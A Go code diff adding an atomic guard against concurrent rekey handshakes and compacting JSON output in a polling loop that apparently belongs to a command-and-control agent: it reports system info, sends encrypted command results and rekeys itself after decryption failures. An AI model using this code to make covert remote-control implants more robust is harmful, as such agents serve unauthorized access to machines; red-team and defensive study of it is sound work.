@@ -19,6 +19,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 )
 
@@ -45,6 +46,7 @@ var (
 	currentPolling  *sync.WaitGroup
 	pollingShutdown chan struct{}
 	pollingMutex    sync.Mutex
+	rekeyInProgress atomic.Bool // Prevent concurrent rekey operations
 )
 
 func init() {
@@ -317,13 +319,17 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		}
 
 		// Perform handshake refresh in a separate goroutine to avoid deadlock
-		go func() {
-			//fmt.Println("[DEBUG] Starting rekey in background...")
-			if err := refreshHandshake(); err != nil {
-			} else {
-				//fmt.Println("[DEBUG] Rekey completed successfully")
-			}
-		}()
+		// Use atomic flag to prevent multiple concurrent rekey operations
+		if rekeyInProgress.CompareAndSwap(false, true) {
+			go func() {
+				defer rekeyInProgress.Store(false)
+				//fmt.Println("[DEBUG] Starting rekey in background...")
+				if err := refreshHandshake(); err != nil {
+				} else {
+					//fmt.Println("[DEBUG] Rekey completed successfully")
+				}
+			}()
+		}
 
 		// Return immediately - the new goroutine will handle the rekey
 		// This allows the current polling goroutine to exit cleanly
@@ -343,13 +349,17 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 			//fmt.Println("[DEBUG] Key desync detected - initiating automatic rekey")
 
 			// Automatically trigger rekey in background
-			go func() {
-				//fmt.Println("[DEBUG] Starting automatic rekey due to decryption failure...")
-				if rekeyErr := refreshHandshake(); rekeyErr != nil {
-				} else {
-					//fmt.Println("[DEBUG] Automatic rekey completed successfully")
-				}
-			}()
+			// Use atomic flag to prevent multiple concurrent rekey operations
+			if rekeyInProgress.CompareAndSwap(false, true) {
+				go func() {
+					defer rekeyInProgress.Store(false)
+					//fmt.Println("[DEBUG] Starting automatic rekey due to decryption failure...")
+					if rekeyErr := refreshHandshake(); rekeyErr != nil {
+					} else {
+						//fmt.Println("[DEBUG] Automatic rekey completed successfully")
+					}
+				}()
+			}
 
 			// Return nil instead of error to prevent cascading failures
 			// The rekey will restart polling with fresh keys
@@ -464,7 +474,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 						Results: results,
 					}
 					//fmt.Println("\n=== Outgoing Command Queue Before Encryption ===")
-					jsonData, err := json.MarshalIndent(encryptedData, "", "    ")
+					jsonData, err := json.Marshal(encryptedData)
 					if err != nil {
 					} else {
 						// ADD DEBUG TO SHOW JSON STRUCTURE
